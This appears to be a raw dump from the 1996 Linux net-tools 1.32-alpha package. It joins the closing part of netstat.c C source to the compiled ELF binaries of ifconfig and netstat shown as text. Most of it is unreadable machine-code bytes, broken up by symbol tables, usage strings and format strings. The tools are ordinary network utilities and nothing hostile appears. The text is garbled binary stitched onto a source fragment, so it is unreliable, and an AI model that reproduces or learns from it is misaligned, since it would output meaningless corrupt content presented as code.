#if HAVE_AFINET
	if (!flag_arg || flag_tcp) {
		i = tcp_info();
		if (i) {  NLS_CATCLOSE(catfd)  return(i); }
	}

	if (!flag_arg || flag_udp) {
		i = udp_info();
		if (i) {  NLS_CATCLOSE(catfd)  return(i); }
	}

	if (!flag_arg || flag_raw) {
		i = raw_info();
		if (i) {  NLS_CATCLOSE(catfd)  return(i); }
	}
#endif

	if (!flag_arg || flag_unx) {
#if HAVE_AFUNIX
		i = unix_info();
		if (i) {  NLS_CATCLOSE(catfd)  return(i); }
#else
		if (flag_arg)
			{ i=1; ENOSUPP("netstat","AF UNIX"); }
#endif
	}

	if(!flag_arg || flag_ipx) {
#if HAVE_AFIPX
		i = ipx_info();
		if(i) {  NLS_CATCLOSE(catfd)  return(i); }
#else
		if (flag_arg)
			{ i=1; ENOSUPP("netstat","AF IPX"); }
#endif
	}

	if(!flag_arg || flag_ax25) {
#if HAVE_AFAX25
		i = ax25_info();
		if(i) {  NLS_CATCLOSE(catfd)  return(i); }
#else
		if (flag_arg)
			{ i=1; ENOSUPP("netstat","AF AX25"); }
#endif
	}

	if(!flag_arg || flag_netrom) {
#if HAVE_AFNETROM
		i = netrom_info();
		if(i) {  NLS_CATCLOSE(catfd)  return(i); }
#else
		if (flag_arg)
			{ i=1; ENOSUPP("netstat","AF NETROM"); }
#endif
	}
	
	if (!flag_cnt || i) break;
	sleep(1);
  }

  NLS_CATCLOSE(catfd)
  return(i);
}
#include <linux/version.h>
#define RELEASE "Linux NET-3 Base Utilities\nSource: net-tools 1.32-alpha net-tools@lina.inka.de (Bernd Eckenfels)\nKernelsource: " UTS_RELEASE
#define Maintainer "net-tools@lina.inka.de (Bernd Eckenfels)"
ELF              P4   8J      4    (      4   44                                       B  B           B  l  X	           F              /lib/ld-linux.so.1  %   ;   )   (                               '             #   %   3       8   ,           &   .   1   0      6       /      4   $      2   -                                             7                                                   5                      	            
         !                      +   9          *   "          :                                                          "      E     #   (   "   *   O      5   #      >        G        Q         W   (l     i   8    "   o   H<      v   T        X    "      h    "      x        X   "      <                                 X         F                               	      "                 &  &      .        6  &   "   =  (O      D  8       J  H    "   P  XI      W  h    "   ^  xC      h       o        v  M       @     
   &   "     4        H                       >        8        g       (    "     8    "                   @        |       |       h      libc.so.5 strcpy ioctl getservent printf setservent strerror _DYNAMIC __ctype_b errno __strtol_internal fgets memcpy _IO_stderr_ perror malloc gethostbyaddr socket __strtoul_internal __ctype_toupper __environ _init getnetbyaddr __libc_init strrchr h_errno environ fprintf strcat __fpu_control strncmp strncpy sscanf strdup index fopen memset fclose inet_ntoa herror strcmp gethostbyname _fini sprintf atexit _GLOBAL_OFFSET_TABLE_ getnetbyname exit __setfpucw endservent strchr close free _h_errno _errno _etext _edata __bss_start _end 5          6  T  X  \  `  d  h  l
  p  t  x  |                         !  "  #  $  %  &  '  (  )  +  ,  .  /  0  1  2  3  4          g.    5L%P    %Th    %Xh   %\h   %`h   %dh    %hh(   %lh0   %ph8   p%th@   `%xhH   P%|hP   @%hX   0%h`    %hh   %hp    %hx   %h   %h   %h   %h   %h   %h   %h   %h   p%h   `%h   P%h   @%h   0%h    %h   %h    %h   %h   %h  %h  %h  %h   %h(  %h0  %h8  p        Y1UUUPSQ       D$Pl$h@*
  P7[&    &       &    SD=D t; u[6UWVSt$D$F,P_  uj O  njhVu     t  uD$Uk  uj[  CPVhs{ t   PCPhSjF,PGPPh7FtjF<PGPh'v jFLPGPh4jF\PGPhA=@ ujN  @       t@jVlR@PhJ    t@jV|R@Phm{    t!@j   R@PhQ    t!@j   R@Ph'=D uj  Dt*    t!Dj   R@Phhf~ uhFthFthFth)Fth0tFth:aF thGNF@thS;~ }h\(FthcFthmFthtFth|Fu   PFPhh(  PL$$Q  P   P   Ph(h|8  PL$Q  P  P   PhQ      ~& u~ uF$    hF&t%   PhfF$f= v%  PhVtF PRhF't%   Ph h-h-[^_]  UWVS$   h/h1D$|$ {  l$6D$Ph   UK  |$ tDB tC; u$  0HD$P$   PSu$  0L$|:pj:SC4  D$D$P  D$D$P8  D$ D$ P  D$$D$$P  D$(D$(P   D$,D$,P$  D$0D$0P(  D$4D$4P  D$8D$8P   D$<D$<P   t$@D$@Ph?S-<D$Pp[^_]  6D$PV[^_]  L$T$D$PPh  Q WVS|$0t$4hD  j VWVfW\$$S[Sh  (PZ(}[^_ v fD$fFWS$Sh  4P#}jj F,P6D$F,D$ F0D$$F4D$(F8W\$SSh'  (P}j j    P9D$   D$"   fD$fFW\$S|Sh  (P{}F    
v D$FW\$SFSh!  (PE}
F    D$FW\$SShp  (P}jj FP}D$FD$ F D$$F$D$(F(W\$SSh  4P}jj F<P,v D$F<D$ F@D$$FDD$(FHW\$SmSh  4Pl}jj FLPv D$FLD$ FPD$$FTD$(FXW\$SSh  4P}jj F\Pv D$F\D$ F`D$$FdD$(FhW\$SShp  (P}jj FP0v D$FD$ F D$$F$D$(F(W\$SqSh  8Ppu2D$   D$    D$$   D$(         WS Sj,Pju&      D$FlD$ FpD$$FtD$(FxWSSj,P(u/      D$F|D$    D$$   D$(   WSSj,Pu2      D$   D$    D$$   D$(   WSESj,Pu2      D$   D$    D$$   D$(   VW1[^_ v L  WVS$\     D$   $X  T$D$Ph  (P})PPh`h[^_L  t$\$K   |$6WV}VhqhRD$&u	= t	WR Ky[^_L  v t$VS}}Shqh[^_L  V[^_L   VSD$,ft$0P\$SSh  (P}[^ f	t$Sh  (P}+PPhhh[^ 61[^  VSD$,ft$0P\$S'Sh  (P&}[^ ff!D$Sh  (P}*P'Phh[^ 1[^ hhhhhhh
h h0hrhXhchvhThhE hh3hh$h)hhYh jPPhzhj6j jj}4j jjm,j jj]0$j jjJ84u,u0u6v    UWVS$   1x(}hjF6$   $       3>-       u
   3    u
$   3    t&3	    t3
    u3    t93    t&3    t3    u$   $    uj 1(Pnj 'v jPt$$V2uV(P8j P  D$|$ uh
  D$T$B<; J	  T$T$T$<T$3    uh   T$R	  3    uh     v 3	    uj T$R  3
    u	j   63    uh   z  v 3	    uh   T$RvZ  3
    uh   2  v 3    uh   T$R.  3	    uh     v 3
    uh   T$R  3      3    ujT$R  3    uY; uj j
j PD$,T$Rh  (Pv  PPh N  33    uY; uj j
j PD$,T$Rh"  (P>
  PhPh7  3G    ujT$R  3R
          PT$R$   PT$Rj T$,B  $   D$,$   D$0$   D$4$   D$8T$Rh  (Pe}#PPh\hC   jT$RP	  3p       ; u@PT$R$   PT$Rj T$,B  $   D$,$   D$0$   D$4$   D$8T$Rh  (P[  PPhx3  63       ; uPT$R+$   PT$Rj T$,Bc  $   D$,$   D$0$   D$4$   D$8T$Rh  (P  PPh{  63
    uy; uT$Rhp  (P  j j j P&D$,T$Rhq  (PJ  PtPh  3    uy; uHT$Rhp  (P   j j j P*fD$4T$Rhq  (P  PPha  3       ; uT$Rhp  (Pc}     6j j
j PD$6T$Rhq  (P&  PPPh  3    ujT$Ry  3       {    PT$R$   PT$Rj T$,B   $   D$,$   D$0$   D$4$   D$8T$Rh  (PK}#PyPhxh)   j  63       ; u4P  uPT$R$   PT$RF}!T$RT$B   8  v $   D$,$   D$0$   D$4$   D$8T$Rh$  (PS}#PPhh1      PT$R$   PT$Rj T$,B}T$RT$B!$   D$,$   D$0$   D$4$   D$8T$Rh  (P}#PPhh{   jAT$R	; (P[^_]   ?FRaf 6UWVSt$\$ D$$Phj/SD$ |$ u\$6D$D$P
   0Jl$H9rS[^_]6T$0L$)T$VD$Pu|$ j_S_D$|$ tD$   S   tShSB[^_]v VSt$f= u= t!V Peu[^; uj,Vthehr1[^6S\$f= u= t69Xt
: u1[  UWVS$  h   P\$ S?$#   \$ j,D$PTtE  E`=`    dv PD$P   ;0L$T
T$   vhhp1[^_]  St= thhOPh?6> M> u(D$Phh    [^_]  l$|$ 1[^_]  Hh!9(QXhh(tHf  VSt$f=  us= t!V Pu[^; u1[^v S\$f=  u(= t69Xt
: u1[WVSt$16PFhSGv0 [^_6D$fftfu5(,ff02(v P_v T$BPBPBPBPBPPhhhh v D$fftfu5ffv Psv UWVSt$T$fj1>       FDHt16<w"v <v   [^_]FDXtCv <wCv <wC	E EG>:\FV1[^_]hhD$ Ph2h}D$fftfu57(;,f?f0A2(v Pv UWVSt$T$Lfj1>       FDHt2v <w"v <v   [^_]FDXtCv <wCv <wC	E EG>:\FV1[^_]I6I6WVSt$h16PFhQSGv0hf h[^_6D$fftfu5W[f_fav P_v D$v D$fftfu5W[f_fav Pv UWVSl$\$f fC  n    uC       [^_]v    uC   [^_]Ut%BCPU   [^_]6Ut)GKGPRQ
PU~1[^_][^_]UWVSl$t$T$ f>ta   [^_]FD$u5  u5f}nE rE6ffE 1[^_]  t FPPU1[^_]v t69C   [uD$11tjjD$P;t'6jPTtPUbuuFPPUGjFCFCFCC0PCUP1[^_]6CPU1[^_]D$P6D$ PdT$L$ff=tfu2(,ff02(QRh(u	(v 1UWVSl$|$f fG  D$    t$6<w<	v[^_]v !C<v<	v	v CAF9vD$G)[^_]v T$D$|$uPR66PR1L$T$u
B    B6T$D$t9t	@u16UWVSje6;   juhPLECE s   1t
FO)u
Uh<6s    uUhs    `Uh	M1[^_]UWVSl$\$u[^_]6|$ t)%  Phh[^_]v = u     u	U6    u	U    u)UPUt@Phhw= u%  PhhR[^_]T$   | uHutFBtZBPBPBPB
PB	PBPQhh$bv BtJPhh<BPBPBPB
PB	PBPhh 	6 v D$f8uP%(,ff02(6WVS\$|$fG  w6<w	<	w`!C<w	v <	w4CAF9vG    t    u[^_v 1[^_6UWVSt$|$\$ f C    C C C C
 C	 C fC  1   tE`D$j jPWtu[^_]uCu%D$8 t[^_]v 1[^_]6uD$8:t[^_]6xSWz[^_]v S8=8t;u[6  Linux NET-3 Base Utilities
Source: net-tools 1.32-alpha net-tools@lina.inka.de (Bernd Eckenfels)
Kernelsource: 2.1.9 ifconfig 1.22 (1996-05-09) overruns lo compressed %-8.8s  Link encap:%s   HWaddr %s 
          %s addr:%s   P-t-P:%s     Bcast:%s   Mask:%s
           IPX/Ethernet II addr:%s
           IPX/Ethernet SNAP addr:%s
           IPX/Ethernet 802.2 addr:%s
           IPX/Ethernet 802.3 addr:%s
           EtherTalk Phase 2 addr:%s
            [NO FLAGS]  UP  BROADCAST  DEBUG  LOOPBACK  POINTOPOINT  NOTRAILERS  RUNNING  NOARP  ALLMULTI  SLAVE  MASTER  MULTICAST   MTU:%d  Metric:%d
 RX packets:%u errors:%u dropped:%u %s:%u
 TX packets:%u errors:%u dropped:%u %s:%u
 Interrupt:%d  Base address:0x%x  Memory:%lx-%lx  DMA chan:%x  
 r /proc/net/dev %d %d %d %d %d %d %d %d %d %d %d SIOCGIFCONF: %s
 %s: unknown interface.
 SIOCSIFFLAGS: %s
 Usage: ifconfig [-a] [-i] [-v] interface
                 [inet address]
                 [hw] [ax25 address]
                 [metric NN] [mtu NN]
                 [trailers] [-trailers]
                 [arp] [-arp]
                 [netmask aa.bb.cc.dd]
                 [dstaddr aa.bb.cc.dd]
                 [mem_start NN] [io_addr NN] [irq NN]
                 [[-] broadcast [aa.bb.cc.dd]]
                 [[-]pointopoint [aa.bb.cc.dd]]
                 [up] [down] ...
 %s
%s
 socket -a -v -V -version --version -? -h -help --help inet arp -arp trailers -trailers promisc -promisc multicast -multicast allmulti -allmulti up down metric SIOCSIFMETRIC: %s
 mtu SIOCSIFMTU: %s
 -broadcast broadcast SIOCSIFBRDADDR: %s
 dstaddr SIOCSIFDSTADDR: %s
 netmask SIOCSIFNETMASK: %s
 mem_start SIOCSIFMAP: %s
 io_addr irq -pointopoint pointopoint hw SIOCSIFHWADDR: %s
 SIOCSIFADDR: %s
 tcpip unix netrom ddp appletalk ipx inet ip ax25 UNSPEC UNIX Domain DARPA Internet IPX Please don't supply more than one address family.
 Too much address family arguments.
 , Unknown address family `%s'.
 Local Loopback Serial Line IP VJ Serial Line IP 6-bit Serial Line IP VJ 6-bit Serial Line IP Adaptive Serial Line IP UNSPEC 10Mbps Ethernet IPIP Tunnel Point-Point Protocol 1.5Mbps ARCnet %02X- [NONE SET] unspec loop slip cslip slip6 cslip6 adaptive %02X:%02X:%02X:%02X:%02X:%02X [NONE SET] ether You cannot start PPP with this program.
 ppp %02X [NONE SET] arcnet  tunnel %02X- [NONE SET] unix unspec default 255.255.255.255 * [NONE SET] inet netstat tcp udp raw %d %s %08lX:%02X%02X%02X%02X%02X%02X %08lX %02X%02X%02X%02X%02X%02X [NONE SET]           ipx      H                                                ::P72\..L$ TX22\  TH2\                                                                                                                                                                                                                                                                                    Ddd$D$                T                                                                                                                                                                                @    .                       B          $D    J           hpx    b           (0                g                                                      4                       t<8                            .>N^n~.>N^n~.>            @          p
                     H   @           h   8   0                           01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01             01.01    GCC: (GNU) 2.7.2.l.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2  GCC: (GNU) 2.7.2.l.2  .symtab .strtab .shstrtab .interp .hash .dynsym .dynstr .rel.bss .rel.plt .init .plt .text .fini .rodata .data .ctors .dtors .got .dynamic .bss .note .comment                                                                       #                           )         pp                1                              9   	      88  0               B   	      hh  @              K         	                    Q         	                  V         PP  +                 \         @@8                    b         HH8  	                 j         B  (                 p         88F                    w         @@F                    ~         HHF                            F                           ||G                                 |G                                 H                                 I                    ELF               4   u      4    (      4   44                                       @o  @o           @o  @@$  |&           r              /lib/ld-linux.so.1  C   G                   >   4                  D   &              2           .           <           8   ?          "   F   6              *   (   1          )       =                            E       B      ;   #   C   7           :      @          /                                                                          A                                 
                                                        '              !      +   -          	      3   ,   0           %          9   $      5                                                         "      E     #   (   "   *   (O      5   8#      >   H6      J        S   h     ]   l      c   Xl     u   h    "   |   x    "      <         pT            "      W             "      H  "                      X   "      <                @                 X      
  F        (             &  8       -  @      5  H    "   =  X     D       R  h      Y  x    "   ^  &      f        n      "   v        }  &   "     O                     "     I            "     (C        8       H        X~       hM       @     
   x&   "     4                               >        8      '      "   ,  g     3      "   9      "   >       G  l     N  4     U  d     \  d     h  %      libc.so.5 strcpy ioctl getservent printf setservent strerror getopt_long _DYNAMIC __ctype_b errno __strtol_internal fscanf fgets memcpy _IO_stderr_ perror feof malloc sleep optarg gethostbyaddr socket __strtoul_internal __ctype_toupper __environ _init getnetbyaddr __libc_init strrchr h_errno rindex environ fprintf strcat __fpu_control strstr read strncmp strncpy realloc strtok sscanf strdup index fopen memset fclose inet_ntoa herror strcmp getpwuid gethostbyname _fini sprintf atexit _GLOBAL_OFFSET_TABLE_ getnetbyname exit __setfpucw endservent open strchr close free _h_errno _errno _etext _edata __bss_start _end    A  h	  p      #  lB             $  (  ,  0  4  8  <  @  D  H  L  P  T  X  \  `  d  h!  l"  p$  t%  x&  |'  (  )  *  +  ,  -  .  /  0  1  2  3  4  6  7  9  :  ;  <  =  >  ?  @          ;J    5%    %h    %h   %h   %h   % h    %$h(   %(h0   %,h8   p%0h@   `%4hH   P%8hP   @%<hX   0%@h`    %Dhh   %Hhp    %Lhx   %Ph   %Th   %Xh   %\h   %`h   %dh   %hh   %lh   p%ph   `%th   P%xh   @%|h   0%h    %h   %h    %h   %h   %h  %h  %h  %h   %h(  %h0  %h8  p%h@  `%hH  P%hP  @%hX  0%h`   %hh  %hp   %hx  %h  %h  %h          Y1UUUPSQ       D$@P\h@Z%  P'[&    &       &    S =  t; u[6h   %hh%   %Pj~hn   h   %%hhw%j j
j P%Phj J%P%Pf% %b6%Pu%     6WVS|$t$4\$8%       %@   $(Px%j j
j P@9      %PD$PP$trfv %PD$,PPtJ>v %j j
j P9u*v %j j
j P9u
%   % %8 [^_6HWVSj h}E=lu hhhhp36hr[^_Hv = t3h=h th)hv jHD$PW  H  D$twtEt#t&8hhR   3hh6   D$Ph         \$D$P6  uj 6  PpPSBPh\$,D$,PQ6  uj A6  PpPSBPh\$<D$<P6  uj  6  PjSBPhJ   tD$BPD$DPh)   tD$DPhh=h NW1[^_Hh6V[^_Hv hFhohhhp[^_Hv !  UWVS1hhY%u~=lth[^_]!  = u	= thhhhpI= t   [^_]!  1[^_]!  v Rh    $  S9%RXua%Rh    V0S9`tVREQ=l tVhhp%RT  $(  D$$   L$$  D$v T$ RT$(RT$0RT$8RT$@RT$HRT$PRT$XRT$lRT$dR$   RT$pRh"`RM8=l tSdRhNhp
6  fD$X fD$H j#3  uT$XRh\hp  T$8J
   $v   (8@H0vnf^VNF>6.D$(    D$$    D$0    D$4    pRT$\RVRL$(QUpRT$\RVRD$4P7 =d u|$<   pRhfT$H  R.  RhL$(Q|$40T$(|$,D$(Tv$|$0$!  ) hL$ QD$PL$(QpRhfT$T  RD.  RhD$8P|$@0T$8|$<D$8T(v$|$0$!  ) hL$QMD$PL$$Q>D$x =x    T$,t	t V6T$$RhT$pR$sv T$$RT$,1QR,$\$hT$xR;v T$$RT$,1QR,$\$T$8RhT$|RT$<RT$DRT$\RT$\RT$\RT$\RT$|RT$|RT$|RT$|Rhiz  ,=% t=%    SD$PL$$QT$@RT$@Rh+=~:=p uT$ RtRhMT$ RhT=x tT$hRhzhm>1[^_]!  #  UWVS1hhd%u~=lthd[^_]#  = u	= thrhhhp	= t   [^_]#  1[^_]#  v Rh    $0  S6%Rua%Rh    S0R`tSRF=l tShhpUv %R^  $  D$$  L$$(  v D$h D$# T$hRT$'RT$,RT$4RT$<RT$DRT$LRT$TRT$\RT$pRT$hR$   RT$tRh`RN7f$    f$    <j,  uT$XRh\hpy  D$$    =x uD$h =l tWdRhNhp9	K  T$8ttD$6D$
6D$pRT$\RSRD$$P~pRT$\RSRL$0Q` =d u|$\   pRhfT$H  R)  RhU|$00T$(D$(Tv"0$(#  ) hL$Q'UD$$PpRhfT$T  Ry(  RhU|$<0T$8D$8T(v"0$(#  ) hL$QUD$ P$x   =x    T$,tt*hT$#RT$(Rh$t  R[   v T$#RT$(RT$01QR,$$h$|  RC6T$#RT$(RT$01QR,$$T$<Rh$  RT$<RT$DRT$\RT$\RT$\RT$\RT$|RT$|RT$|RT$|Rhiz  ,=% t	=% tlL$QD$PL$ QT$@RT$@Rh=~hhM=x t$h  Rhh1[^_]#  #  UWVS1hha%u~=lth[^_]#  = u	= th*hhhpQ= t   [^_]#  1[^_]#  v Rh    $0  SA6%R`ua%Rh    S0RA`tSRFY=l tShhpv %R\&  D$HD$L$XL$$  D$$  6D$h D$# T$hRT$'RT$,RT$4RT$<RT$DRT$LRT$TRT$\RT$pRT$hR$   RT$tRh`RN{D$`    f$    f$    <j;'  uT$XRh\hpK  =x uD$h =l tWdRhNhp}	  pRL$QSRD$ PpRL$0QSRU =d u|$\   pRh8fT$H  R#  Rh$<  S|$,0T$(D$(Tv"0$(#  ) hL$QSD$ PpRh8fT$T  R"  RhS0T$8D$8T(v"0$(#  ) hUSU$x   =x    T$,tt*hT$#RT$(Rh$t  R   v T$#RT$(RT$01QR,$`$h$|  RC6T$#RT$(RT$01QR,$`$T$<Rh$  RNT$<RT$DRT$\RT$\RT$\RT$\RT$|RT$|RT$|RT$|Rhiz  K,=% t	=% thhUL$QT$@RT$@Rh<{=~hhM`=x t$h  RhBh51[^_]#  H@  UWVS1D$    hhh%   =lt hhV[^_]H@  v = u	= thwhhhp= t   [^_]H@  1[^_]H@  v Ph    $`   ShStD$   v %Pu^%Ph    Su0P`tSPF=l tShhp%Ph=d thhh*  T$XT$$X  T$l$8v D$X $X   T$RT$RD$(PD$0PD$8PD$@PD$HPD$PPh`PN(=l tWdPhNhp"  D$u T$RT$Rff$`  =d u|$ uD$*L  D$&|$, uD$!D$$HwC$)&06:>D$ wR$v  (0H2D$*t%MWblfzfD$8|D$:D$*th}UD$*thUD$*thUhUT$RT$RWSUD$LPT$<Rh[(1[^_]H@  v   UWVSD$(    D$$    hhD$(|$     =lt hr[^_]  v = u	= thhhhp= t   [^_]  1[^_]  v hz=~h(dhWj  D$ |$ u2hFh.hhhpT[^_]  T$ Rh   $   SY\$L$   T$T$<T$T$ Rh   U,	  D$,PD$4PD$<PD$DPST$(Rh=UL j:T$R   FD$(PhQVfD$(%  D$(D$    u    tJj:SVt) FD$$PhQVfD$$%  D$$hFhD$   D$0tt
T$RT$RjT$$BpPT$ RT$,BPUgD$DPUhT$<R,|$ uDT$RSjT$$BpPT$ RT$,BPUD$@PUhS,6ffD$LVST$RD$@PD$HPh=~8=p uD$,P.t PhD$,PhhT$ R1[^_]  6hFhTUS\$Sh|CPCPhj   PC|PCtPClPhM(   P   PCxPCpPh*f{ uhCthCthCthCthCthC th{ }hCth!~C@th#kCth%XhK[6  UWVS$   hh'D$|$ k  l$6D$Ph   U\;  |$ thDB tC; u$  0HD$P$   PSu$  0L$|:pj:SDC   D$D$P   D$D$P   D$ D$ P   D$$D$$PFxD$(D$(PFpD$,D$,P   D$0D$0P   D$4D$4PF|D$8D$8PFtD$<D$<Plt$@D$@Ph5S<D$P[^_]  D$P[^_]   WVS|$0t$4h   j VqWVJW\$$S?Sh  %P>(}+lPlPhVhpl[^_ fD$fFWSSh  %P}jj FP6D$FD$ F D$$F$D$(F(W\$SSh'  %P}jj F\Pv D$F\D$ F`D$$FdD$(FhW\$SESh  %PD}	F    D$FW\$SSh!  %P}
F    D$FW\$SSh  %P}jj F,PD$F,D$ F0D$$F4D$(F8W\$SSh  %P}jj F<Pv D$F<D$ F@D$$FDD$(FHW\$S9Sh  %P8}jj FLP4v D$FND$ FRD$$FVD$(FZVW1[^_   WVSj jj%}hh_[^_  D$   $   L$D$Ph  R}*ho%Pm[^_  v h{nhdt$\$KxG|$v WV}Vhhp^D$$u	=d t	W Ky%P1[^_  6DPPPLPHPhjWv hhphVhph|hphhp hhph3hphmhphhpy hhpghhpXhThpIhhp: hhp(hhph7hp
jcv   UWVS$  |$4|   U  d  D$PD$Ph$U$  Qi  Cyw$6|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| ||||||||||p|||||||||||||||||(|4@L|| X||||d|||D$v'hFh=hhhpDP  jP  vjv Ta`UdIh=l1%Xpp tt x@v \|h!  jO%lX\T`~#= t|         |=T tD[^_]  v =` tCv PpP  u=h tj[^_]  v =\    =d  ud h u   6u
   pt	5u Vhd   `=h Sj4v =X t+v _=h $j= t= u= u	=| tshN=d t
hv hhk=~h=x thh= t	= tX= t	= t%7= t	=| t= t	= t= t	= t= t]= t!   hhhhp= t*= t!   hEhhhp=h tujBB6[^_]  UWVSt$ |$$\$(FPhOWd   1T$<   1T$ p  1D$D$PT$$RL$$QhT~?= t F6PF4PF0Phfv F4PF0PhwWFPBPhWFPBPh WFPF(P>	  PhwWFPF*P$	  Ph](WFPF,P	  Ph@[^_]  UWVS19$$    T$T$$   = tOSC6PC4PC0PC,PC*PCPC(PCPT$4Rh$H  R0uK[^_]  6SC4PC0PC,PC*PCPC(PCPT$0Rh$D  R,v = t
u8	t3hhh1h=hpu[^_]  6fC fC c|$    uCg-6k|$    thhsv CoCCCCfC(fC(fC*fC*fC,fC,8E9$$  [^_]  v   UWVSD$    hh?D$|$ uU=lt h[^_]  v hhhhp?   [^_]  h	  u6hhhhpT$$R[^_]  T$Rh   \$ ShlSh  u;hhshh=hp}T$(RC[^_]    1j7PT$Ru.    D$UVuhhT$R}t	V[^_]  6\$|$ ~rh$   u
hv hz|$ ~0T$RB<$   R$   RS89|t	V&1[^_]  UWVSl$\$f fC  B    uC       [^_]J    uC   [^_]U>t%BCPUo   [^_]6Ut)GKGPRQPU21[^_]l[^_]UWVSl$t$T$ f>tla   [^_]FD$u5  u5f}BE FE6fZfE 1[^_]  t FPPU1[^_]v t69C   [uD$11tjjD$P/t'6jPHtPUuuFPBPUjFCFCFCC0PCUP1[^_]6CPU1[^_]D$P6D$ PT$L$ff=tfu2\`fdffQRhu	v 1UWVSl$|$f fG  D$    t$6<w<	v[^_]v !C<v<	v	v CAF9vD$G)[^_]v T$D$|$uPR66PR1L$T$u
B    B6T$D$t9t	@u16UWVSj6   juhl[PECE st   1t
FO)u
Uh<6sx    uUhs|    `Uh	M1[^_]UWVSl$\$uZ[^_]6|$ t)%  Phh\h\[^_]v = u\ t    u	U6x    u	U|    u)UPUt@Phh\=\ u%  Phh\\[^_]fd 6UWVSt$\$ D$$Phd j/SD$ |$ u\$6D$D$Pz   0Jl$H9rSm[^_]6T$0L$)T$VD$Pgu|$ j_SD$|$ tD$  d  S   tShd S[^_]v VSt$f=d uh=h t!V Pu[^; uj,VXthhp1[^6S\$f=d uh=h t69Xt
: u1[  UWVS$  h   P\$ S$#   \$ j,D$PtE  E=    v PD$P   ;0d L$T
T$   vhhp1[^_]  St=d  th4hd Phd o6> M> u(D$Ph6hp0   [^_]  l$|$ 1[^_]   \v    UWVS$  $     h   P\$S$   6j,VDt C> uR6Vu#VhThpo   [^_]   P u Phx1Uuu[^_]   WVSt$16PFhS8Gv0 [^_6D$fftfu5ffv P_v D$v D$fftfu5 ff$&v Pv T$   | uHutFBtZBPBPBPB
PB	PBPQhh\$bv BtJPhh\<BPBPBPB
PB	PBPhh\ 	6\ \v D$f8uP%f f6WVS\$|$fG  w6<w	<	w`!C<w	v <	w4CAF9vG    t    u[^_v 1[^_6UWVSt$|$\$ f C    C C C C
 C	 C fC  1   tE`D$j jPWtu[^_]uCu%D$8 t[^_]v 1[^_]6uD$8:t[^_]6xSWz[^_]v   UWVShhD$ |$ u-h)h2h;hp8   [^_]  hd$  uh}$  uh$  ~hD$    D$     D$$    $  L$|$h$h  $   $  L$6L$Qh  L$Q  D$PD$$PD$,PWD$8PD$@PD$HPD$PPUVL$8QhL$DQ4	~\$XSVj$  PSPV$   \$dSUj($  QSPUu$   \$HSWjjSPWM$    $   ,D$4th$  PD$4th$  PuT$4tff$  th$  PDD$4th$  P(D$4th$  PD$4 th$  P$  uWD$5t$D$,PD$,P$  PWVh~-L$QD$0PD$8PD$4P$  PWUVhO$$  uND$5t$  PWVh	'.6L$QD$ PD$(PD$0P$  PWUVh@$$  D$5t'D$,PD$,P$  PWVhhYD$PD$$PD$,PL$QD$<PD$DPD$@P$  PWUVh0L$Qn1[^_]  6Shh,u#hh2h;hpZ   [hh!hp7S1[6WVS\$    tVWut
VWg[^_  UWVS$  T$hHj+u2hbhhhhp[^_]  hNhhD$$|$ uh[^_]  T$Rh  $  S]\$T$0T$$   $0  \$ T$Rh  T$R(   T$RUWh$T$$RW~SWjFT$(RSFPWTSUjF(T$RSFPU6ST$$RjFT$8RSFPT$8R,T$RUWh-/Kv T$R1[^_]  S=t;u[6            [  +NEW_ADDRT +RTF_IRTT +RTF_REJECT +RT_NETLINK +FW_MASQUERADE -NLS
AF:(inet) +UNIX +INET +IPX -AX25 -NETROM -ATALK 
HW: +ETHER +ARC +SLIP +PPP +TUNNEL -TR -AX25 -NETROM -FR  Linux NET-3 Base Utilities
Source: net-tools 1.32-alpha net-tools@lina.inka.de (Bernd Eckenfels)
Kernelsource: 2.1.9 netstat 1.19 (1996-05-17) Fred Baumgarten <dc6iq@insu1.etec.uni-karlsruhe.de> and Alan Cox. r /dev/hdaq   
 /dev/route netstat %s: no support for `%s' on this system.
 Netlink Kernel Messages  (continous) read /dev/route net-tools@lina.inka.de (Bernd Eckenfels) netlink message size mismatch netstat.c %s: Internal Error `%s'.
Contact: %s
 NEWROUTE	 DELROUTE	 NEWDEVICE	 DELDEVICE	 UNKNOWN%lx	 %s/%s  0x%x %d  %s /proc/net/tcp AF INET (tcp) %d: %lX:%X %lX:%X %X %lX:%lX %X:%lX %lX %d
 %s -> %d args netstat: unsupported address family %d !
 ESTABLISHED SYN_SENT SYN_RECV FIN_WAIT1 FIN_WAIT2 TIME_WAIT CLOSE CLOSING CLOSE_WAIT LAST_ACK LISTEN UNKNOWN tcp : off (0.00/%ld) on (%2.2f/%ld) unkn-%d (%2.2f/%ld) tcp   %6ld %6ld %-23s %-23s %-12s %-10s  %-10d        Y@/proc/net/udp AF INET (udp) %d: %lX:%X %lX:%X %X %lX:%lX %X:%lX %lX %c %s
  udp off (0.00/%ld) %c on (%2.2f/%ld) %c unkn-%d (%2.2f/%ld) %c udp   %6ld %6ld %-23s %-23s %-12s v       Y@/proc/net/raw AF INET (raw) raw raw   %6ld %6ld %-23s %-23s %-12s 6      Y@/proc/net/unix AF UNIX Inode Active UNIX domain sockets  (including servers) (w/o servers) 
Proto RefCnt Flags       Type       State         I-Node Path
 %p: %lX %lX %lX %X %X %s %s - unix ?? STREAM DGRAM RAW RDM SEQPACKET FREE LISTENING CONNECTING CONNECTED DISCONNECTING [  ACC  W  N  ] %-5s %-6ld %-11s %-10s %-13s %-6s %s
 /proc/net/ipx AF IPX Active IPX sockets
Proto Recv-Q Send-Q Local Address              Foreign Address            State  User AF_IPX missing %s %s %lX %lX %d %d %X /proc/net/ipx sport format error Not_Connected /proc/net/ipx dport format error ESTAB UNK. %s:%04X IPX   %6ld %6ld %-26s %-26s %-5s  %-10s  %-10d %-5.5s  %5d %3d  %6u %6u %6u %6u  [NO FLAGS] A B D L M N O P R U /proc/net/dev %d %d %d %d %d %d %d %d %d %d %d SIOCGIFFLAGS: %s
 socket SIOCGIFCONF Kernel Interface table
 Iface   MTU Met  RX-OK RX-ERR RX-DRP RX-OVR  TX-OK TX-ERR TX-DRP TX-OVR Flags
 %s: unknown interface.
 %s
%s
%s
%s
 usage: netstat [-veenNcCF] [<Af>] -r         netstat {-V|--version|-h|--help}
        netstat [-vnNcaeo] [<Socket>]
